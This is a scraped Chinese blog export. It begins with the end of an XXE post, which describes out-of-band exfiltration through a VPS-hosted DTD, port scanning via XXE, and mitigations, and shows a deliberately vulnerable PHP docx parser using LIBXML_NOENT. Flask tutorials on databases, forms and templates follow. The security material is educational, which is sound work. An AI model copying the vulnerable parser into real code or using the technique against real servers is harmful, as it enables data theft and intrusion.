直接通过DTD外部实体声明（针对有回显的情况） 下图为一个XXE-labs中的测试 外部文档类型定义（DTD）文件可被用于触发OOB XXE。攻击者将.dtd文件托管在VPS上，使远程易受攻击的服务器获取该文件并执行其中的恶意命令。（不进行回显）外部DTD的内容其中php是伪协议不必多说。大概说一下原理，因为实战中大部分都是不进行回显，那么我们可以让服务器主动请求攻击者的VPS。那么我们让服务器引用写在VPS的DTD然后他会将payload加载，然后带进并访问我们的VPS，然后我们的VPS查看access_log可以接受到payload返回信息 端口扫描 BP中的intruder模块设置如下因为其连接特性，如果一个端口开放会进行很快的响应，如果未开放，会进行多次连接进行到一定次数才会显示连接失败。那么爆破可以根据其完成一次相应的时间。由于网络延时 or 某些协议的特有的连接方式，会显示不是特别精确有一定的误差 爆破如下所示 防御XXE漏洞12php:libxml_disable_entity_loader(true); 123JAVA:DocumentBuilderFactory dbf =DocumentBuilderFactory.newInstance();dbf.setExpandEntityReferences(false); 123Python：from lxml import etreexmlData = etree.parse(xmlSource,etree.XMLParser(resolve_entities=False)) 或者是将关键词 ex:DOCYPE,ENTITY进行过滤。 2020-4-2补充 docx文档注入 下面是一个简单的示例代码123456789101112131415161718&lt;?php if(isset($_POST[\"submit\"])) &#123; $target_file = getcwd().\"/upload/\".md5($_FILE[\"file\"][\"tmp_name\"]); if (move_uploaded_file($_FILES[\"file\"][\"tmp_name\"], $target_file)) &#123; try &#123; $result = @file_get_contents(\"zip://\".$target_file.\"#docProps/core.xml\"); $xml = new SimpleXMLElement($result, LIBXML_NOENT); $xml-&gt;registerXPathNamespace(\"dc\", \"http://purl.org/dc/elements/1.1/\"); foreach($xml-&gt;xpath('//dc:title') as $title)&#123; echo \"Title '\".$title . \"' has been added.&lt;br/&gt;\"; &#125; &#125; catch (Exception $e)&#123;echo \"The file you uploaded is not a valid xml or docx file.\"; &#125; &#125; else &#123;echo \"Sorry, there was an error uploading your file.\"; &#125;&#125; 攻击示例：","categories":[{"name":"XML注入","slug":"XML注入","permalink":"http://www.r1ght0us.xyz/categories/XML注入/"}],"tags":[{"name":"XML","slug":"XML","permalink":"http://www.r1ght0us.xyz/tags/XML/"},{"name":"XXE","slug":"XXE","permalink":"http://www.r1ght0us.xyz/tags/XXE/"}]},{"title":"flask之数据库","slug":"flask之数据库","date":"2019-01-26T10:11:58.000Z","updated":"2019-01-27T02:50:07.917Z","comments":true,"path":"2019/01/26/flask之数据库/","link":"","permalink":"http://www.r1ght0us.xyz/2019/01/26/flask之数据库/","excerpt":"flask深入学习之第四部分","text":"flask深入学习之第四部分 数据库使用Flask-SQLAlchemy管理数据库Flask-SQLAlchemy是一个Flask扩展，简化了在Flask程序中使用SQLAlchemy的操作。SQLAlchemy是一个很强大的关系型数据库框架，支持多种数据库后台。SQLAlchemy提供了高层ORM，也提供了使用数据库原生SQL的低层功能。 使用pip安装此扩展pip install flask-sqlalchemy 在Flask-SQLAlchemy中，数据库使用URL指定。最流行的数据库引擎采用的数据库URL格式如表 数据库引擎 URL MySQL mysql://username:password@hostname/database Postgres postgresql://username:password@hostname/database SQLite（Unix） sqlite:////absolute/path/to/database SQLite（Windows） sqlite:///c:/absolute/path/to/database 在这些URL中，hostname 表示MySQL服务所在的主机，可以是本地主机（localhost），也可以是远程服务器。数据库服务器上可以托管多个数据库，因此database 表示要使用的数据库名。如果数据库需要进行认证，username和password表示数据库用户密令。 SQLite数据库不需要使用服务器，因此不用指定hostname、username和password。URL中的database 是硬盘上文件的文件名。 程序使用的数据库URL 必须保存到Flask 配置对象的SQLALCHEMY_DATABASE_URI键中。配置对象中还有一个很有用的选项，即SQLALCHEMY_COMMIT_ON_TEARDOWN键，将其设为True时，每次请求结束后都会自动提交数据库中的变动。 配置数据库如下：123456from flask.ext.sqlalchemy import SQLAlchemybasedir = os.path.abspath(os.path.dirname(__file__))app = Flask(__name__)app.config['SQLALCHEMY_DATABASE_URI'] ='sqlite:///' + os.path.join(basedir, 'data.sqlite')app.config['SQLALCHEMY_COMMIT_ON_TEARDOWN'] = Truedb = SQLAlchemy(app) db对象是SQLAlchemy类的实例，表示程序使用的数据库，同时还获得了Flask-SQLAlchemy提供的所有功能。 这里我使用的是MySQL数据库与sqlite不同，MySQL使用，应将上面的SQLALCHEMY_DATABASE_URI改为：mysql+pymysql://username:password@host/database因此还要安装pymysql；pip install pymysql 定义模型模型这个术语表示程序使用的持久化实体。在ORM中，模型一般是一个Python类，类中的属性对应数据库表中的列。Flask-SQLAlchemy创建的数据库实例为模型提供了一个基类以及一系列辅助类和辅助函数，可用于定义模型的结构。 如下所示，定义一个Role和User模型123456789101112131415class Role(db.Model): __tablename__ = 'roles' id = db.Column(db.Integer, primary_key=True) name = db.Column(db.String(64), unique=True) def __repr__(self): return '&lt;Role %r&gt;' % self.nameclass User(db.Model): __tablename__ = 'users' id = db.Column(db.Integer, primary_key=True) username = db.Column(db.String(64), unique=True, index=True) def __repr__(self): return '&lt;User %r&gt;' % self.username 类变量__tablename__定义在数据库中使用的表名。如果没有定义tablename，Flask-SQLAlchemy会使用一个默认名字，但默认的表名没有遵守使用复数形式进行命名的约定，所以最好由我们自己来指定表名。其余的类变量都是该模型的属性，被定义为db.Column类的实例。 db.Column类构造函数的第一个参数是数据库列和模型属性的类型。下表列出了一些可用的列类型以及在模型中使用的Python类型。 类型名 Python类型 说明 Integer int 普通整数，一般是32位 SmallInteger int 取值范围小的整数，一般是16位 BigInteger int或long 不限制精度的整数 Float float 浮点数 Numeric decimal.Decimal 定点数 String str 变长字符串 Text str 变长字符串，对较长或不限长度的字符串做了优化 Unicode unicode 变长Unicode字符串 UnicodeText unicode 变长Unicode字符串，对较长或不限长度的字符串做了优化 Boolean bool 布尔值 Date datetime.date 日期 Time datetime.time 时间 DateTime datetime.datetime 日期和时间 Interval datetime.timedelta 时间间隔 Enum str 一组字符串 PickleType 任何Python对象 自动使用Pickle序列化 LargeBinary str 二进制文件 db.Column中其余的参数指定属性的配置选项如下： 选项名 说明 primary_key 如果设为True，这列就是表的主键 unique 如果设为True，这列不允许出现重复的值 index 如果设为True，为这列创建索引，提升查询效率 nullable 如果设为True，这列允许使用空值；如果设为False，这列不允许使用空值 default 为这列定义默认值 虽然没有强制要求，但这两个模型都定义了__repr()__方法，返回一个具有可读性的字符串表示模型，可在调试和测试时使用。 关系关系型数据库使用关系把不同表中的行联系起来。再上图所示的关系图表示用户和角色之间的一种简单关系。这是角色到用户的一对多关系，因为一个角色可属于多个用户，而每个用户都只能有一个角色。 1234567class Role(db.Model): # ... users = db.relationship('User', backref='role')class User(db.Model): # ... role_id = db.Column(db.Integer, db.ForeignKey('roles.id')) 关系使用users表中的外键连接了两行。添加到User模型中的role_id列被定义为外键，就是这个外键建立起了关系。传给db.ForeignKey()的参数roles.id表明，这列的值是roles表中行的id值。添加到Role模型中的users属性代表这个关系的面向对象视角。对于一个Role类的实例，其users属性将返回与角色相关联的用户组成的列表。db.relationship()的第一个参数表明这个关系的另一端是哪个模型。如果模型类尚未定义，可使用字符串形式指定。db.relationship()中的backref参数向User模型中添加一个role属性，从而定义反向关系。这一属性可替代role_id访问Role模型，此时获取的是模型对象，而不是外键的值。大多数情况下，db.relationship()都能自行找到关系中的外键，但有时却无法决定把哪一列作为外键。如果无法决定外键，你就要为db.relationship()提供额外参数，从而确定所用外键。如下所示： 选项名 说明 backref 在关系的另一个模型中添加反向引用 primaryjoin 明确指定两个模型之间使用的联结条件。只在模棱两可的关系中需要指定 lazy 指定如何加载相关记录。可选值有select（首次访问时按需加载）、immediate（源对象加载后就加载）、joined（加载记录，但使用联结）、subquery（立即加载，但使用子查询），noload（永不加载）和dynamic（不加载记录，但提供加载记录的查询） uselist 如果设为Fales，不使用列表，而使用标量值 order_by 指定关系中记录的排序方式 secondary 指定多对多关系中关系表的名字 secondaryjoin SQLAlchemy无法自行决定时，指定多对多关系中的二级联结条件 数据库操作 创建表首先，我们要让Flask-SQLAlchemy根据模型类创建数据库。方法是使用db.create_all()函数：123(venv) $ python hello.py shell&gt;&gt;&gt; from hello import db&gt;&gt;&gt; db.create_all() 在使用python shell时，需要将app参数导入至flask-script中的Manager类中：123456from flask-script import Manager# .....manager = Manager(app)#....if __name__=\"__main__\": manager.run() 删除表 1db.drop_all() 插入行下面这些代码将创建Role和User 1234567&gt;&gt;&gt; from hello import Role, User &gt;&gt;&gt; admin_role = Role(name='Admin')&gt;&gt;&gt; mod_role = Role(name='Moderator')&gt;&gt;&gt; user_role = Role(name='User')&gt;&gt;&gt; user_john = User(username='john', role=admin_role)&gt;&gt;&gt; user_susan = User(username='susan', role=user_role)&gt;&gt;&gt; user_david = User(username='david', role=user_role) 模型的构造函数接受的参数是使用关键字参数指定的模型属性初始值。注意，role属性也可使用，虽然它不是真正的数据库列，但却是一对多关系的高级表示。但是这些改动并未写入数据库中，需要通过数据库会话管理对数据库所做的改动，会话由db.session表示。准备把对象写入数据库之前，先要将其添加到会话中：123456&gt;&gt;&gt; db.session.add(admin_role)&gt;&gt;&gt; db.session.add(mod_role)&gt;&gt;&gt; db.session.add(user_role)&gt;&gt;&gt; db.session.add(user_john)&gt;&gt;&gt; db.session.add(user_susan)&gt;&gt;&gt; db.session.add(user_david) 为了把对象写入数据库，我们要调用commit()方法提交会话：&gt;&gt;&gt; db.session.commit() 数据库会话也可回滚。调用db.session.rollback()后，添加到数据库会话中的所有对象都会还原到它们在数据库时的状态。 修改行在数据库会话上调用add()方法也能更新模型。我们继续在之前的shell会话中进行操作，下面这个例子把”Admin”角色重命名为”Administrator”： 123&gt;&gt;&gt; admin_role.name = 'Administrator'&gt;&gt;&gt; db.session.add(admin_role)&gt;&gt;&gt; db.session.commit() 删除行数据库会话还有个delete()方法。下面这个例子把”Moderator”角色从数据库中删除： 12&gt;&gt;&gt; db.session.delete(mod_role)&gt;&gt;&gt; db.session.commit() 查询行Flask-SQLAlchemy为每个模型类都提供了query对象。最基本的模型查询是取回对应表中的所有记录： 1234&gt;&gt;&gt; Role.query.all()[&lt;Role u'Administrator'&gt;, &lt;Role u'User'&gt;]&gt;&gt;&gt; User.query.all()[&lt;User u'john'&gt;, &lt;User u'susan'&gt;, &lt;User u'david'&gt;] 若想看到原生的SQL查询语句，需要将其转换为字符串类型即可。下表列出了可在query对象上调用的常用过滤器： 滤器 说明 filter() 把过滤器添加到原查询上，返回一个新查询 filter_by() 把等值过滤器添加到原查询上，返回一个新查询 limit() 使用指定的值限制原查询返回的结果数量，返回一个新查询 offset() 偏移原查询返回的结果，返回一个新查询 order_by() 根据指定条件对原查询结果进行排序，返回一个新查询 group_by() 根据指定条件对原查询结果进行分组，返回一个新查询 在查询上应用指定的过滤器后，通过调用all()执行查询，以列表的形式返回结果。除了all()之外，还有其他方法能触发查询执行。下表列出了执行查询的其他方法： 方法 说明 all() 以列表形式返回查询的所有结果 first() 返回查询的第一个结果，如果没有结果，则返回None first_or_404() 返回查询的第一个结果，如果没有结果，则终止请求，返回404错误响应 get() 返回指定主键对应的行，如果没有对应的行，则返回None get_or_404() 返回指定主键对应的行，如果没找到指定的主键，则终止请求，返回404错误响应 count() 返回查询结果的数量 paginate() 返回一个Paginate对象，它包含指定范围内的结果 使用Flask-Migrate实现数据库迁移在开发程序的过程中，你会发现有时需要修改数据库模型，而且修改之后还需要更新数据库。仅当数据库表不存在时，Flask-SQLAlchemy才会根据模型进行创建。因此，更新表的唯一方式就是先删除旧表，不过这样做会丢失数据库中的所有数据。更新表的更好方法是使用数据库迁移框架。源码版本控制工具可以跟踪源码文件的变化，类似地，数据库迁移框架能跟踪数据库模式的变化，然后增量式的把变化应用到数据库中。 安装此扩展:pip install flask-migrate 使用方法如下：1234from flask.ext.migrate import Migrate, MigrateCommand# ...migrate = Migrate(app, db)manager.add_command('db', MigrateCommand) 在维护数据库迁移之前，要使用init子命令创建迁移仓库：12345678910(venv) $ python hello.py db initCreating directory /home/flask/flasky/migrations...doneCreating directory /home/flask/flasky/migrations/versions...doneGenerating /home/flask/flasky/migrations/alembic.ini...doneGenerating /home/flask/flasky/migrations/env.py...doneGenerating /home/flask/flasky/migrations/env.pyc...doneGenerating /home/flask/flasky/migrations/README...doneGenerating /home/flask/flasky/migrations/script.py.mako...donePlease edit configuration/connection/logging settings in'/home/flask/flasky/migrations/alembic.ini' before proceeding. 这个命令会创建migrations文件夹，所有迁移脚本都存放其中。 数据库迁移用迁移脚本表示。脚本中有两个函数，分别是upgrade()和downgrade()。upgrade()函数把迁移中的改动应用到数据库中，downgrade()函数则将改动删除。 使用migrate命令自动创建，手动创建的迁移只是一个骨架，upgrade()和downgrade()函数都是空的。migrate子命令用来自动创建迁移脚本：123456789(venv) $ python hello.py db migrate -m \"initial migration\"INFO [alembic.migration] Context impl SQLiteImpl.INFO [alembic.migration] Will assume non-transactional DDL.INFO [alembic.autogenerate] Detected added table 'roles'INFO [alembic.autogenerate] Detected added table 'users'INFO [alembic.autogenerate.compare] Detected added index'ix_users_username' on '['username']'Generating /home/flask/flasky/migrations/versions/1bc594146bb5_initial_migration.py...done 我们可以使用db upgrade命令把迁移应用到数据库中：1234(venv) $ python hello.py db upgradeINFO [alembic.migration] Context impl SQLiteImpl.INFO [alembic.migration] Will assume non-transactional DDL.INFO [alembic.migration] Running upgrade None -&gt; 1bc594146bb5, initial migration 本章完整程序123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778import osfrom flask import Flask, render_template, session, redirect, url_forfrom flask_bootstrap import Bootstrapfrom flask_moment import Momentfrom flask_wtf import FlaskFormfrom wtforms import StringField, SubmitFieldfrom wtforms.validators import DataRequiredfrom flask_sqlalchemy import SQLAlchemybasedir = os.path.abspath(os.path.dirname(__file__))app = Flask(__name__)app.config['SECRET_KEY'] = 'hard to guess string'app.config['SQLALCHEMY_DATABASE_URI'] =\\ 'sqlite:///' + os.path.join(basedir, 'data.sqlite')app.config['SQLALCHEMY_TRACK_MODIFICATIONS'] = Falsebootstrap = Bootstrap(app)moment = Moment(app)db = SQLAlchemy(app)class Role(db.Model): __tablename__ = 'roles' id = db.Column(db.Integer, primary_key=True) name = db.Column(db.String(64), unique=True) users = db.relationship('User', backref='role', lazy='dynamic') def __repr__(self): return '&lt;Role %r&gt;' % self.nameclass User(db.Model): __tablename__ = 'users' id = db.Column(db.Integer, primary_key=True) username = db.Column(db.String(64), unique=True, index=True) role_id = db.Column(db.Integer, db.ForeignKey('roles.id')) def __repr__(self): return '&lt;User %r&gt;' % self.usernameclass NameForm(FlaskForm): name = StringField('What is your name?', validators=[DataRequired()]) submit = SubmitField('Submit')@app.shell_context_processordef make_shell_context(): return dict(db=db, User=User, Role=Role)@app.errorhandler(404)def page_not_found(e): return render_template('404.html'), 404@app.errorhandler(500)def internal_server_error(e): return render_template('500.html'), 500@app.route('/', methods=['GET', 'POST'])def index(): form = NameForm() if form.validate_on_submit(): user = User.query.filter_by(username=form.name.data).first() if user is None: user = User(username=form.name.data) db.session.add(user) db.session.commit() session['known'] = False else: session['known'] = True session['name'] = form.name.data return redirect(url_for('index')) return render_template('index.html', form=form, name=session.get('name'), known=session.get('known', False))","categories":[{"name":"python编程","slug":"python编程","permalink":"http://www.r1ght0us.xyz/categories/python编程/"}],"tags":[{"name":"python","slug":"python","permalink":"http://www.r1ght0us.xyz/tags/python/"},{"name":"flask","slug":"flask","permalink":"http://www.r1ght0us.xyz/tags/flask/"}]},{"title":"flask之Web表单","slug":"flask之Web表单","date":"2019-01-24T04:22:56.000Z","updated":"2019-01-24T06:45:13.322Z","comments":true,"path":"2019/01/24/flask之Web表单/","link":"","permalink":"http://www.r1ght0us.xyz/2019/01/24/flask之Web表单/","excerpt":"flask深入学习之第三部分","text":"flask深入学习之第三部分 Web表单 为了增强安全性，密钥不应该直接写入代码，而要保存在环境变量中。 抵御csrfFlask-WTF能保护所有表单免受跨站请求伪造（Cross-Site Request Forgery，CSRF）的攻击。恶意网站把请求发送到被攻击者已登录的其他网站时就会引发CSRF攻击。为了实现CSRF保护，Flask-WTF需要程序设置一个密钥。Flask-WTF使用这个密钥生成加密令牌，再用令牌验证请求中表单数据的真伪。设置密钥的方法如下：12app = Flask(__name__)app.config['SECRET_KEY'] = 'hard to guess string' app.config字典可用来存储框架、扩展和程序本身的配置变量，SECRET_KEY配置变量是通用密钥，可在Flask和多个第三方扩展中使用。如其名所示，加密的强度取决于变量值的机密程度。不同的程序要使用不同的密钥，而且要保证其他人不知道你所用的字符串。 pip install flask-wtf安装flask-wtf 表单类使用Flask-WTF时，每个Web表单都由一个继承自Form的类表示。这个类定义表单中的一组字段，每个字段都用对象表示。字段对象可附属一个或多个验证函数。验证函数用来验证用户提交的输入值是否符合要求。1234567from flask.ext.wtf import Formfrom wtforms import StringField, SubmitFieldfrom wtforms.validators import Requiredclass NameForm(Form): name = StringField('What is your name?', validators=[Required()]) submit = SubmitField('Submit') 在上面的实例中，NameForm表单中有一个名为name的文本字段和一个名为submit的提交按钮。StringField类表示属性为type=”text”的&lt;input&gt;元素。SubmitField类表示属性为type=”submit”的&lt;input&gt;元素。字段构造函数的第一个参数是把表单渲染成HTML时使用的标号。StringField构造函数中的可选参数validators指定一个由验证函数组成的列表，在接受用户提交的数据之前验证数据。验证函数Required()确保提交的字段不为空。 Form基类由Flask-WTF扩展定义，所以从flask.ext.wtf中导入。字段和验证函数却可以直接从WTForms包中导入。 WTForms支持的HTML字段如下： 字段类型 说明 StringField 文本字段 TextAreaField 多行文本字段 PasswordField 密码文本字段 HiddenField 隐藏文本字段 DateField 文本字段，值为datetime.date格式 DateTimeField 文本字段，值为datetime.datetime格式 IntegerField 文本字段，值为整数 DecimalField 文本字段，值为decimal.Decimal FloatField 文本字段，值为浮点数 BooleanField 复选框，值为True和False RadioField 一组单选框 SelectField 下拉列表 SelectMultipleField 下拉列表，可选择多个值 FileField 文件上传字段 SubmitField 表单提交按钮 FormField 把表单作为字段嵌入另一个表单 FieldList 组指定类型的字段 WTForms包含的验证函数： 验证函数 说明 Email 验证电子邮件地址 EqualTo 比较两个字段的值；常用于要求输入两次密码进行确认的情况 IPAddress 验证IPv4网络地址 Length 验证输入字符串的长度 NumberRange 验证输入的值在数字范围内 Optional 无输入值时跳过其他验证函数 Required 确保字段中有数据 Regexp 使用正则表达式验证输入值 URL 验证URL AnyOf 确保输入值在可选值列表中 NoneOf 确保输入值不在可选值列表中 将表单渲染成HTMLFlask-Bootstrap提供了一个非常高端的辅助函数，可以使用Bootstrap中预先定义好的表单样式渲染整个Flask-WTF表单，而这些操作只需一次调用即可完成。12&#123;% import \"bootstrap/wtf.html\" as wtf %&#125;&#123;&#123; wtf.quick_form(form) &#125;&#125; import指令的使用方法和普通Python代码一样，允许导入模板中的元素并用在多个模板中。导入的bootstrap/wtf.html文件中定义了一个使用Bootstrap渲染Falsk-WTF表单对象的辅助函数。wtf.quick_form()函数的参数为Flask-WTF表单对象，使用Bootstrap的默认样式渲染传入的表单。 在视图函数中处理表单12345678@app.route('/', methods=['GET', 'POST'])def index(): name = None form = NameForm() if form.validate_on_submit(): name = form.name.data form.name.data = '' return render_template('index.html', form=form, name=name) app.route修饰器中添加的methods参数告诉Flask在URL映射中把这个视图函数注册为GET和POST请求的处理程序。如果没指定methods参数，就只把视图函数注册为GET请求的处理程序。局部变量name用来存放表单中输入的有效名字，如果没有输入，其值为None。如上述代码所示，在视图函数中创建一个NameForm类实例用于表示表单。提交表单后，如果数据能被所有验证函数接受，那么validate_on_submit()方法的返回值为True，否则返回False。这个函数的返回值决定是重新渲染表单还是处理表单提交的数据。 用户第一次访问程序时，服务器会收到一个没有表单数据的GET请求，所以validate_on_submit()将返回False。if语句的内容将被跳过，通过渲染模板处理请求，并传入表单对象和值为None的name变量作为参数。用户会看到浏览器中显示了一个表单。用户提交表单后，服务器收到一个包含数据的POST请求。validate_on_submit()会调用name字段上附属的Required()验证函数。如果名字不为空，就能通过验证，validate_on_submit()返回True。现在，用户输入的名字可通过字段的data属性获取。在if语句中，把名字赋值给局部变量name，然后再把data属性设为空字符串，从而清空表单字段。最后一行调用render_template()函数渲染模板，但这一次参数name的值为表单中输入的名字，因此会显示一个针对该用户的欢迎消息。 重定向和用户会话用户输入名字后提交表单，然后点击浏览器的刷新按钮，会看到一个莫名其妙的警告，要求在再次提交表单之前进行确认。之所以出现这种情况，是因为刷新页面时浏览器会重新发送之前已经发送过的最后一个请求。如果这个请求是一个包含表单数据的POST请求，刷新页面后会再次提交表单。大多数情况下，这并不是理想的处理方式。(使用CHORME浏览器进行尝试) 基于这个原因，最好别让Web程序把POST请求作为浏览器发送的最后一个请求。 这种需求的实现方式是，使用重定向作为POST请求的响应，而不是使用常规响应。重定向是一种特殊的响应，响应内容是URL，而不是包含HTML代码的字符串。浏览器收到这种响应时，会向重定向的URL发起GET请求，显示页面的内容。这个页面的加载可能要多花几微秒，因为要先把第二个请求发给服务器。除此之外，用户不会察觉到有什么不同。现在，最后一个请求是GET请求，所以刷新命令能像预期的那样正常使用了。这个技巧称为Post/重定向/Get模式。 但是这种重定向也有一些弊端，其无法保存用户所输入的信息，无法形成会话，因此需要导入session保存用户输入的信息。下例就使用了session保存信息 12345678from flask import Flask, render_template, session, redirect, url_for@app.route('/', methods=['GET', 'POST'])def index(): form = NameForm() if form.validate_on_submit(): session['name'] = form.name.data return redirect(url_for('index')) return render_template('index.html', form=form, name=session.get('name')) session[&#39;name&#39;]，在两次请求之间也能记住输入的值。其中包含合法表单数据的请求最后会调用redirect()函数。redirect()是个辅助函数，用来生成HTTP重定向响应。redirect()函数的参数是重定向的URL，这里使用的重定向URL是程序的根地址，因此重定向响应本可以写得更简单一些，写成redirect(‘/‘)，但却会使用Flask提供的URL生成函数url_for()。推荐使用url_for()生成URL，因为这个函数使用URL映射生成URL，从而保证URL和定义的路由兼容，而且修改路由名字后依然可用。url_for()函数的第一个且唯一必须指定的参数是端点名，即路由的内部名字。默认情况下，路由的端点是相应视图函数的名字。在这个示例中，处理根地址的视图函数是index()，因此传给url_for()函数的名字是index。render_template()函数中，使用session.get(&#39;name&#39;)直接从会话中读取name参数的值。和普通的字典一样，这里使用get()获取字典中键对应的值以避免未找到键的异常情况，因为对于不存在的键，get()会返回默认值None。 Flash消息请求完成后，有时需要让用户知道状态发生了变化。这里可以使用确认消息、警告或者错误提醒。一个典型例子是，用户提交了有一项错误的登录表单后，服务器发回的响应重新渲染了登录表单，并在表单上面显示一个消息，提示用户用户名或密码错误。flash()函数可实现这种效果 1234567891011from flask import Flask, render_template, session, redirect, url_for, flash@app.route('/', methods=['GET', 'POST'])def index(): form = NameForm() if form.validate_on_submit(): old_name = session.get('name') if old_name is not None and old_name != form.name.data: flash('Looks like you have changed your name!') session['name'] = form.name.data return redirect(url_for('index')) return render_template('index.html',form = form, name = session.get('name')) 在这个示例中，每次提交的名字都会和存储在用户会话中的名字进行比较，而会话中存储的名字是前一次在这个表单中提交的数据。如果两个名字不一样，就会调用flash()函数，在发给客户端的下一个响应中显示一个消息。在这个示例中，每次提交的名字都会和存储在用户会话中的名字进行比较，而会话中存储的名字是前一次在这个表单中提交的数据。如果两个名字不一样，就会调用flash()函数，在发给客户端的下一个响应中显示一个消息。仅调用flash()函数并不能把消息显示出来，程序使用的模板要渲染这些消息。最好在基模板中渲染Flash消息，因为这样所有页面都能使用这些消息。Flask把get_flashed_messages()函数开放给模板，用来获取并渲染消息。 这一章的完整程序：123456789101112131415161718192021222324252627282930313233343536373839404142from flask import Flask, render_template, session, redirect, url_for, flashfrom flask_bootstrap import Bootstrapfrom flask_moment import Momentfrom flask_wtf import FlaskFormfrom wtforms import StringField, SubmitFieldfrom wtforms.validators import DataRequiredapp = Flask(__name__)app.config['SECRET_KEY'] = 'hard to guess string'bootstrap = Bootstrap(app)moment = Moment(app)class NameForm(FlaskForm): name = StringField('What is your name?', validators=[DataRequired()]) submit = SubmitField('Submit')@app.errorhandler(404)def page_not_found(e): return render_template('404.html'), 404@app.errorhandler(500)def internal_server_error(e): return render_template('500.html'), 500@app.route('/', methods=['GET', 'POST'])def index(): form = NameForm() if form.validate_on_submit(): old_name = session.get('name') if old_name is not None and old_name != form.name.data: flash('Looks like you have changed your name!') session['name'] = form.name.data return redirect(url_for('index')) return render_template('index.html', form=form, name=session.get('name'))if __name__ == \"__main__\": app.run()","categories":[{"name":"python编程","slug":"python编程","permalink":"http://www.r1ght0us.xyz/categories/python编程/"}],"tags":[{"name":"python","slug":"python","permalink":"http://www.r1ght0us.xyz/tags/python/"},{"name":"flask","slug":"flask","permalink":"http://www.r1ght0us.xyz/tags/flask/"}]},{"title":"flask之模板","slug":"flask之模板","date":"2019-01-16T06:54:09.000Z","updated":"2019-01-16T07:20:39.598Z","comments":true,"path":"2019/01/16/flask之模板/","link":"","permalink":"http://www.r1ght0us.xyz/2019/01/16/flask之模板/","excerpt":"flask深入学习之第二部分","text":"flask深入学习之第二部分 模板模板是一个包含响应文本的文件，其中包含用占位变量表示的动态部分，其具体值只在请求的上下文中才能知道。使用真实值替换变量，再返回最终得到的响应字符串，这一过程称为渲染。为了渲染模板，Flask使用了一个名为Jinja2的强大模板引擎。 Jinja2模板引擎形式最简单的Jinja2模板就是一个包含响应文本的文件。例如：1&lt;h1&gt;Hello World!&lt;/h1&gt; 或者是响应中包含变量，1&lt;h1&gt;Hello, &#123;&#123; name &#125;&#125;!&lt;/h1&gt; &lt;!-- name即为其中的变量 --&gt; 默认情况下，Flask在程序文件夹中的templates子文件夹中寻找模板。把前面定义的模板保存在templates文件夹中，并分别命名为index.html和user.html。例如：123456789101112131415from flask import Flask, render_templateapp = Flask(__name__)@app.route('/')def index(): return render_template('index.html')@app.route('/user/&lt;name&gt;')def user(name): return render_template('user.html', name=name)if __name__=='__main__': app.run() Flask提供的render_template函数把Jinja2模板引擎集成到了程序中。render_template函数的第一个参数是模板的文件名。随后的参数都是键值对，表示模板中变量对应的真实值。在这段代码中，第二个模板收到一个名为name的变量。在模板中使用的结构表示一个变量，它是一种特殊的占位符，告诉模板引擎这个位置的值从渲染模板时使用的数据中获取。Jinja2能识别所有类型的变量，甚至是一些复杂的类型，例如列表、字典和对象。 可以使用过滤器修改变量，过滤器名添加在变量名之后，中间使用竖线分隔。例如，下述模板以首字母大写形式显示变量name的值：1Hello, &#123;&#123; name|capitalize &#125;&#125; 下表为Jinja2提供的常见过滤器过滤器名|说明-|-|safe|渲染值时不转义capitalize|把值的首字母转换成大写，其他字母转换成小写lower|把值转换成小写形式upper|把值转换成大写形式title|把值中每个单词的首字母都转换成大写trim|把值的首尾空格去掉striptags|渲染之前把值中所有的HTML标签都删掉 safe过滤器值得特别说明一下。默认情况下，出于安全考虑，Jinja2会转义所有变量。例如，如果一个变量的值为&lt;h1&gt;Hello&lt;/h1&gt;，Jinja2会将其渲染成&amp;lt;h1&amp;gt;Hello&amp;lt;/h1&amp;gt;，浏览器能显示这个h1元素，但不会进行解释。很多情况下需要显示变量中存储的HTML代码，这时就可使用safe过滤器。 千万别在不可信的值上使用safe过滤器，例如用户在表单中输入的文本。 Jinja2提供了多种控制结构，可用来改变模板的渲染流程。 - 使用条件控制语句。 12345&#123;% if user %&#125; Hello, &#123;&#123; user &#125;&#125;!&#123;% else %&#125; Hello, Stranger!&#123;% endif %&#125; - for循环，常见需求是在模板中渲染一组元素。 12345&lt;ul&gt; &#123;% for comment in comments %&#125; &lt;li&gt;&#123;&#123; comment &#125;&#125;&lt;/li&gt; &#123;% endfor %&#125;&lt;/ul&gt; Jinja2还支持宏。宏类似于Python代码中的函数。12345678&#123;% macro render_comment(comment) %&#125; &lt;li&gt;&#123;&#123; comment &#125;&#125;&lt;/li&gt;&#123;% endmacro %&#125;&lt;ul&gt; &#123;% for comment in comments %&#125; &#123;&#123; render_comment(comment) &#125;&#125; &#123;% endfor %&#125;&lt;/ul&gt; 为了重复使用宏，我们可以将其保存在单独的文件中，然后在需要使用的模板中导入：123456&#123;% import 'macros.html' as macros %&#125;&lt;ul&gt; &#123;% for comment in comments %&#125; &#123;&#123; macros.render_comment(comment) &#125;&#125; &#123;% endfor %&#125;&lt;/ul&gt; 需要在多处重复使用的模板代码片段可以写入单独的文件，再包含在所有模板中，以避免重复：1&#123;% include 'common.html' %&#125; 另一种重复使用代码的强大方式是模板继承，它类似于Python代码中的类继承。首先，创建一个名为base.html的基模板：1234567891011&lt;html&gt;&lt;head&gt;&#123;% block head %&#125;&lt;title&gt;&#123;% block title %&#125;&#123;% endblock %&#125; - My Application&lt;/title&gt;&#123;% endblock %&#125;&lt;/head&gt;&lt;body&gt;&#123;% block body %&#125;&#123;% endblock %&#125;&lt;/body&gt;&lt;/html&gt; block标签定义的元素可在衍生模板中修改。在本例中，我们定义了名为head、title和body的块。注意，title包含在head中。下面这个示例是基模板的衍生模板：12345678910&#123;% extends \"base.html\" %&#125;&#123;% block title %&#125;Index&#123;% endblock %&#125;&#123;% block head %&#125;&#123;&#123; super() &#125;&#125;&lt;style&gt;&lt;/style&gt;&#123;% endblock %&#125;&#123;% block body %&#125;&lt;h1&gt;Hello, World!&lt;/h1&gt;&#123;% endblock %&#125; extends指令声明这个模板衍生自base.html。在extends指令之后，基模板中的3个块被重新定义，模板引擎会将其插入适当的位置。注意新定义的head块，在基模板中其内容不是空的，所以使用super()获取原来的内容。 自定义错误页面Flask允许程序使用基于模板的自定义错误页面。最常见的错误代码有两个： 404，客户端请求未知页面或路由时显示； 500，有未处理的异常时显示。为这两个错误代码指定自定义处理程序的方式如下所示：123456@app.errorhandler(404)def page_not_found(e): return render_template('404.html'), 404@app.errorhandler(500)def internal_server_error(e): return render_template('500.html'), 500 使用模板继承可以避免大量的体力劳动 